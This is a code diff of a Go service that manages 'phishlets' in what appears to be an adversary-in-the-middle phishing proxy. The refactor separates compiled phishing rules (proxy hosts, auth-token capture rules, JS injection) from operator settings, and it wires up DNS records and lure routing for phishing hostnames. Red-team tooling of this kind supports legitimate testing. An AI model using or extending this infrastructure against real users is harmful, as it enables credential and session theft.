@@ -4,7 +4,6 @@ import (
 	"context"
 	"errors"
 	"fmt"
-	"log/slog"
 	"net"
 	"regexp"
 	"strings"
@@ -17,32 +16,13 @@ var (
 	ErrHostnameConflict = errors.New("hostname is already in use by another phishlet")
 )
 
-// phishletStore is the persistence interface required by PhishletService.
-// It persists only operator config fields; compiled rule fields are never stored.
-type phishletStore interface {
-	GetPhishlet(name string) (*Phishlet, error)
-	SetPhishlet(p *Phishlet) error
-	ListPhishlets() ([]*Phishlet, error)
-	DeletePhishlet(name string) error
-}
-
-// Phishlet is the unified type representing a phishlet — combining the compiled
-// rules from its YAML file with the operator's runtime configuration.
-//
-// The compiled rule fields (ProxyHosts, SubFilters, etc.) are populated by the
-// phishlet loader and are never persisted. The operator config fields (Hostname,
-// BaseDomain, etc.) are persisted to the database and survive restarts.
-//
-// Either group of fields may be zero-valued: a freshly loaded YAML has no
-// operator config; a record loaded from the database has no compiled rules.
-// The daemon merges both at startup and on reload.
+// Phishlet is a compiled phishlet definition. It is the shareable artifact
+// produced by parsing and compiling a phishlet YAML file.
 type Phishlet struct {
-	// Identity (from YAML)
 	Name    string
 	Author  string
 	Version string
 
-	// Compiled rules (from YAML — in-memory only, never persisted)
 	ProxyHosts  []ProxyHost
 	SubFilters  []SubFilter
 	AuthTokens  []TokenRule
@@ -51,26 +31,6 @@ type Phishlet struct {
 	ForcePosts  []ForcePost
 	Intercepts  []InterceptRule
 	JSInjects   []JSInject
-
-	// Operator config (persisted to SQLite)
-	BaseDomain  string
-	DNSProvider string
-	Hostname    string
-	SpoofURL    string
-	Enabled     bool
-	Hidden      bool
-}
-
-// applyOperatorConfig copies all operator-config fields from src into p.
-// This is the single place that lists which fields are persisted, so adding a
-// new operator field only requires updating this method.
-func (p *Phishlet) applyOperatorConfig(src *Phishlet) {
-	p.BaseDomain = src.BaseDomain
-	p.DNSProvider = src.DNSProvider
-	p.Hostname = src.Hostname
-	p.SpoofURL = src.SpoofURL
-	p.Enabled = src.Enabled
-	p.Hidden = src.Hidden
 }
 
 // MatchesHost reports whether hostname belongs to this phishlet under baseDomain.
@@ -95,18 +55,41 @@ func (p *Phishlet) FindLanding() *ProxyHost {
 
 // FindProxyHost returns the proxy host whose phishing FQDN matches phishHost,
 // stripping any port and normalising case. Returns nil if no host matches.
-func (p *Phishlet) FindProxyHost(phishHost string) *ProxyHost {
+func (p *Phishlet) FindProxyHost(phishHost, baseDomain string) *ProxyHost {
 	host := phishHost
 	if h, _, err := net.SplitHostPort(phishHost); err == nil {
 		host = h
 	}
 	lowerHost := strings.ToLower(host)
 	for i := range p.ProxyHosts {
-		if strings.EqualFold(p.ProxyHosts[i].PhishHost(p.BaseDomain), lowerHost) {
+		if strings.EqualFold(p.ProxyHosts[i].PhishHost(baseDomain), lowerHost) {
 			return &p.ProxyHosts[i]
 		}
 	}
 	return nil
+}
+
+// PhishletConfig holds the operator's runtime settings for a phishlet.
+// Persisted to SQLite and survives daemon restarts.
+type PhishletConfig struct {
+	Name        string
+	BaseDomain  string
+	DNSProvider string
+	Hostname    string
+	SpoofURL    string
+	Enabled     bool
+}
+
+// ConfiguredPhishlet pairs a compiled phishlet with operator config.
+// This is what the resolver stores and the proxy uses during request handling.
+type ConfiguredPhishlet struct {
+	Definition *Phishlet
+	Config     *PhishletConfig
+}
+
+// PhishletFilter controls which configs are returned by ListConfigs.
+type PhishletFilter struct {
+	Enabled *bool
 }
 
 // ProxyHost maps a phishing subdomain to a real upstream host.
@@ -229,112 +212,170 @@ type JSInject struct {
 	Script        string
 }
 
-// PhishletService owns all business logic for phishlet lifecycle.
-// It is the single point of truth for which phishlets are active: every
-// enable/disable writes to the store AND updates the in-memory resolver,
-// so the proxy router never falls out of sync with the database.
-// dnsReconciler manages DNS records for phishlet proxy hosts.
+type phishletStore interface {
+	SavePhishlet(name string, yaml string) error
+	GetPhishlet(name string) (string, error)
+	ListPhishlets() ([]string, error)
+	SetConfig(p *PhishletConfig) error
+	GetConfig(name string) (*PhishletConfig, error)
+	ListConfigs(filter PhishletFilter) ([]*PhishletConfig, error)
+	DeletePhishlet(name string) error
+}
+
+type phishletResolver interface {
+	Get(name string) *ConfiguredPhishlet
+	Register(cp *ConfiguredPhishlet)
+	OwnerOf(hostname string) string
+	ResolveHostname(hostname, urlPath string) (*ConfiguredPhishlet, *Lure, error)
+	LoadLuresFromDB() error
+	InvalidateLures()
+}
+
+type phishletCompiler interface {
+	Compile(yaml string) (*Phishlet, error)
+}
+
 type dnsReconciler interface {
 	Reconcile(ctx context.Context, records []PhishletRecord) error
 	RemoveRecords(ctx context.Context, records []PhishletRecord) error
 }
 
+// PhishletService owns all business logic for phishlet lifecycle.
+// Every enable/disable writes to the store AND updates the in-memory resolver,
+// so the proxy router never falls out of sync with the database.
 type PhishletService struct {
-	store    phishletStore
-	bus      eventBus
-	dns      dnsReconciler
-	resolver *phishletResolver
+	Store    phishletStore
+	Bus      eventBus
+	DNS      dnsReconciler
+	Resolver phishletResolver
+	Compiler phishletCompiler
 }
 
-func NewPhishletService(store phishletStore, bus eventBus, dns dnsReconciler, lureStore lureStore, logger *slog.Logger) *PhishletService {
-	return &PhishletService{
-		store:    store,
-		bus:      bus,
-		dns:      dns,
-		resolver: newPhishletResolver(lureStore, logger),
-	}
-}
-
-// LoadFromDB merges stored operator configs into the routing index and
-// populates the lure cache. Call once during startup after YAML files have
-// been loaded, before the proxy begins accepting connections.
+// LoadFromDB compiles stored definitions, applies operator config, and
+// registers enabled phishlets in the resolver. Call once at startup.
 func (s *PhishletService) LoadFromDB() error {
-	stored, err := s.store.ListPhishlets()
+	enabled := true
+	configs, err := s.Store.ListConfigs(PhishletFilter{Enabled: &enabled})
 	if err != nil {
 		return fmt.Errorf("loading phishlets: %w", err)
 	}
 
-	for _, storedPhishlet := range stored {
-		p := s.resolver.get(storedPhishlet.Name)
-		if p == nil {
-			// YAML not loaded yet — register config-only so the operator can still
-			// query and modify it via the API.
-			s.resolver.register(storedPhishlet)
+	for _, cfg := range configs {
+		yaml, err := s.Store.GetPhishlet(cfg.Name)
+		if err != nil || yaml == "" {
 			continue
 		}
-
-		merged := *p
-		merged.applyOperatorConfig(storedPhishlet)
-		s.resolver.register(&merged)
+		def, err := s.Compiler.Compile(yaml)
+		if err != nil {
+			continue
+		}
+		s.Resolver.Register(&ConfiguredPhishlet{Definition: def, Config: cfg})
 	}
 
-	return s.resolver.loadLuresFromDB()
+	return s.Resolver.LoadLuresFromDB()
 }
 
-// Register stores a compiled phishlet definition in the routing index.
-// Call this when loading phishlets from YAML files at startup or on live reload.
-// If the phishlet was previously enabled, operator config (hostname, enabled
-// state, etc.) is preserved so hot-reload doesn't disrupt active phishlets.
-func (s *PhishletService) Register(p *Phishlet) {
-	if existing := s.resolver.get(p.Name); existing != nil {
-		p.applyOperatorConfig(existing)
+// Push validates phishlet YAML and stores the definition.
+func (s *PhishletService) Push(yaml string) (*Phishlet, error) {
+	def, err := s.Compiler.Compile(yaml)
+	if err != nil {
+		return nil, err
 	}
-	s.resolver.register(p)
+	if err := s.Store.SavePhishlet(def.Name, yaml); err != nil {
+		return nil, err
+	}
+	s.Bus.Publish(Event{Type: sdk.EventPhishletPushed, Payload: def})
+	return def, nil
 }
 
-// ResolveHostname returns the phishlet and best-matching lure for a request hostname.
-// Returns nil, nil, nil when no active phishlet owns the hostname.
-func (s *PhishletService) ResolveHostname(hostname, urlPath string) (*Phishlet, *Lure, error) {
-	return s.resolver.resolveHostname(hostname, urlPath)
+// ResolveHostname returns the configured phishlet and best-matching lure for a
+// request hostname. Returns nil, nil, nil when no active phishlet owns the hostname.
+func (s *PhishletService) ResolveHostname(hostname, urlPath string) (*ConfiguredPhishlet, *Lure, error) {
+	return s.Resolver.ResolveHostname(hostname, urlPath)
 }
 
 // InvalidateLures reloads the lure cache after any lure mutation.
 // Satisfies the lureInvalidator interface so LureService can notify the routing index.
 func (s *PhishletService) InvalidateLures() {
-	s.resolver.invalidateLures()
+	s.Resolver.InvalidateLures()
 }
 
 // Enable marks a phishlet as active, optionally updating its hostname, base
-// domain, and DNS provider. The resolver is updated atomically so routing
-// takes effect immediately without a restart. If a DNS reconciler is configured,
-// A records are created for each proxy host's phishing FQDN.
-func (s *PhishletService) Enable(ctx context.Context, name, hostname, dnsProvider string) (*Phishlet, error) {
-	p := s.currentOrNew(name)
-	if hostname != "" {
-		p.Hostname = hostname
-	}
-	if dnsProvider != "" {
-		p.DNSProvider = dnsProvider
-	}
-	if p.Hostname == "" {
-		return nil, ErrHostnameRequired
-	}
-	if p.BaseDomain == "" {
-		p.BaseDomain = deriveBaseDomain(s.resolver.get(name), p.Hostname)
-	}
-	if owner := s.resolver.ownerOf(p.Hostname); owner != "" && owner != p.Name {
-		return nil, ErrHostnameConflict
-	}
-	p.Enabled = true
-	if err := s.store.SetPhishlet(p); err != nil {
+// domain, and DNS provider. The resolver is updated so routing takes effect
+// immediately. If a DNS reconciler is configured, A records are created for
+// each proxy host's phishing FQDN.
+func (s *PhishletService) Enable(ctx context.Context, name, hostname, dnsProvider string) (*ConfiguredPhishlet, error) {
+	yaml, err := s.Store.GetPhishlet(name)
+	if err != nil {
 		return nil, err
 	}
-	if err := s.dns.Reconcile(ctx, phishletRecords(p)); err != nil {
+	def, err := s.Compiler.Compile(yaml)
+	if err != nil {
+		return nil, err
+	}
+
+	// Start from existing config or create a new one.
+	cfg, err := s.Store.GetConfig(name)
+	if err != nil {
+		cfg = &PhishletConfig{Name: name}
+	}
+
+	if hostname != "" {
+		cfg.Hostname = hostname
+	}
+	if dnsProvider != "" {
+		cfg.DNSProvider = dnsProvider
+	}
+	if cfg.Hostname == "" {
+		return nil, ErrHostnameRequired
+	}
+	if cfg.BaseDomain == "" {
+		cfg.BaseDomain = deriveBaseDomain(def, cfg.Hostname)
+	}
+	if owner := s.Resolver.OwnerOf(cfg.Hostname); owner != "" && owner != cfg.Name {
+		return nil, ErrHostnameConflict
+	}
+	cfg.Enabled = true
+
+	if err := s.Store.SetConfig(cfg); err != nil {
+		return nil, err
+	}
+	cp := &ConfiguredPhishlet{Definition: def, Config: cfg}
+	if err := s.DNS.Reconcile(ctx, phishletRecords(cp)); err != nil {
 		return nil, fmt.Errorf("dns reconcile: %w", err)
 	}
-	s.resolver.register(p)
-	s.bus.Publish(Event{Type: sdk.EventPhishletEnabled, Payload: p})
-	return p, nil
+	s.Resolver.Register(cp)
+	s.Bus.Publish(Event{Type: sdk.EventPhishletEnabled, Payload: cp})
+	return cp, nil
+}
+
+// Disable marks a phishlet as inactive and removes its DNS records.
+func (s *PhishletService) Disable(ctx context.Context, name string) (*ConfiguredPhishlet, error) {
+	cp := s.Resolver.Get(name)
+	if cp == nil {
+		return nil, ErrNotFound
+	}
+	if cp.Config.Enabled {
+		if err := s.DNS.RemoveRecords(ctx, phishletRecords(cp)); err != nil {
+			return nil, fmt.Errorf("dns cleanup: %w", err)
+		}
+	}
+	cp.Config.Enabled = false
+	if err := s.Store.SetConfig(cp.Config); err != nil {
+		return nil, err
+	}
+	s.Resolver.Register(cp)
+	return cp, nil
+}
+
+// Get returns the phishlet config by name.
+func (s *PhishletService) Get(name string) (*PhishletConfig, error) {
+	return s.Store.GetConfig(name)
+}
+
+// List returns all phishlet configs.
+func (s *PhishletService) List() ([]*PhishletConfig, error) {
+	return s.Store.ListConfigs(PhishletFilter{})
 }
 
 // deriveBaseDomain infers the base domain from the phishing hostname by matching
@@ -353,99 +394,14 @@ func deriveBaseDomain(def *Phishlet, hostname string) string {
 	return ""
 }
 
-// Disable marks a phishlet as inactive and removes its DNS records.
-func (s *PhishletService) Disable(ctx context.Context, name string) (*Phishlet, error) {
-	p, err := s.currentOrErr(name)
-	if err != nil {
-		return nil, err
-	}
-	if p.Enabled {
-		if err := s.dns.RemoveRecords(ctx, phishletRecords(p)); err != nil {
-			return nil, fmt.Errorf("dns cleanup: %w", err)
-		}
-	}
-	p.Enabled = false
-	if err := s.store.SetPhishlet(p); err != nil {
-		return nil, err
-	}
-	s.resolver.register(p)
-	return p, nil
-}
-
-// Hide marks a phishlet as hidden (suppressed from lure URL generation).
-// Does not affect routing — the phishlet keeps intercepting traffic.
-func (s *PhishletService) Hide(name string) (*Phishlet, error) {
-	p, err := s.currentOrErr(name)
-	if err != nil {
-		return nil, err
-	}
-	p.Hidden = true
-	if err := s.store.SetPhishlet(p); err != nil {
-		return nil, err
-	}
-	s.resolver.register(p)
-	return p, nil
-}
-
-// Unhide reverses Hide.
-func (s *PhishletService) Unhide(name string) (*Phishlet, error) {
-	p, err := s.currentOrErr(name)
-	if err != nil {
-		return nil, err
-	}
-	p.Hidden = false
-	if err := s.store.SetPhishlet(p); err != nil {
-		return nil, err
-	}
-	s.resolver.register(p)
-	return p, nil
-}
-
-// Get returns the phishlet by name, preferring the resolver's in-memory
-// copy (which has compiled rules) over the store.
-func (s *PhishletService) Get(name string) (*Phishlet, error) {
-	if p := s.resolver.get(name); p != nil {
-		return p, nil
-	}
-	return s.store.GetPhishlet(name)
-}
-
-// List returns all stored phishlet operator configs.
-func (s *PhishletService) List() ([]*Phishlet, error) {
-	return s.store.ListPhishlets()
-}
-
-// currentOrNew returns a copy of the registered phishlet (if any), otherwise
-// a shell loaded from the store or newly created.
-func (s *PhishletService) currentOrNew(name string) *Phishlet {
-	if p := s.resolver.get(name); p != nil {
-		copy := *p
-		return &copy
-	}
-	stored, err := s.store.GetPhishlet(name)
-	if err != nil {
-		return &Phishlet{Name: name}
-	}
-	return stored
-}
-
-// currentOrErr returns a copy of the current phishlet state or an error if not found anywhere.
-func (s *PhishletService) currentOrErr(name string) (*Phishlet, error) {
-	if p := s.resolver.get(name); p != nil {
-		copy := *p
-		return &copy, nil
-	}
-	return s.store.GetPhishlet(name)
-}
-
 // phishletRecords builds the DNS A records needed for a phishlet's proxy hosts.
 // Each proxy host's phishing FQDN needs an A record in the base domain zone.
-func phishletRecords(p *Phishlet) []PhishletRecord {
-	records := make([]PhishletRecord, 0, len(p.ProxyHosts))
-	for _, ph := range p.ProxyHosts {
+func phishletRecords(cp *ConfiguredPhishlet) []PhishletRecord {
+	records := make([]PhishletRecord, 0, len(cp.Definition.ProxyHosts))
+	for _, ph := range cp.Definition.ProxyHosts {
 		records = append(records, PhishletRecord{
-			Zone: p.BaseDomain,
-			Name: ph.PhishHost(p.BaseDomain),
+			Zone: cp.Config.BaseDomain,
+			Name: ph.PhishHost(cp.Config.BaseDomain),
 		})
 	}
 	return records
